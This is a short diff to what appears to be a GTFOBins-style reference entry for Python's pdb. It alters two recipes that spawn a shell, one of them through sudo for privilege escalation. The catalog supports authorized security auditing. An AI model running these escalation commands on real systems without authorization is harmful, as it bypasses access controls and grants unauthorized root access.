@@ -2,14 +2,14 @@
 functions:
   shell:
     - code: |
-        TF=$(mktemp -d)
-        echo 'import os; os.system("/bin/sh")' > $TF/x
-        pdb $TF/x
+        TF=$(mktemp)
+        echo 'import os; os.system("/bin/sh")' > $TF
+        pdb $TF
         cont
   sudo:
     - code: |
-        TF=$(mktemp -d)
-        echo 'import os; os.system("/bin/sh")' > $TF/x
-        sudo pdb $TF/x
+        TF=$(mktemp)
+        echo 'import os; os.system("/bin/sh")' > $TF
+        sudo pdb $TF
         cont
 ---
